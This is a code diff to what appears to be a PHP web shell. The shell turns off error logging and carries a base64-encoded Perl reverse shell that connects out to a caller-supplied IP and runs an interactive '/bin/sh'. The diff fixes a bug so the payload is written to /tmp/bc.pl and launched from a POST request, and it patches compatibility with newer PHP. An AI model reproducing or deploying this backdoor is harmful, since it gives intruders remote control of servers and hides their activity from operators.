@@ -2,7 +2,9 @@
 session_start();
 error_reporting(0);
 set_time_limit(0);
-@set_magic_quotes_runtime(0);
+if(function_exists('set_magic_quotes_runtime')){
+	set_magic_quotes_runtime(0);
+}
 @clearstatcache();
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
@@ -1700,7 +1702,7 @@ if($_GET['logout'] == true) {
 	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
 	if(isset($_POST['sub_bc'])) {
 		$f_bc = fopen("/tmp/bc.pl", "w");
-		fwrite($f_bc, base64_decode($bind_connect_p));
+		fwrite($f_bc, base64_decode($back_connect_p));
 		fclose($f_bc);
 
 		$ipbc = $_POST['ip_bc'];
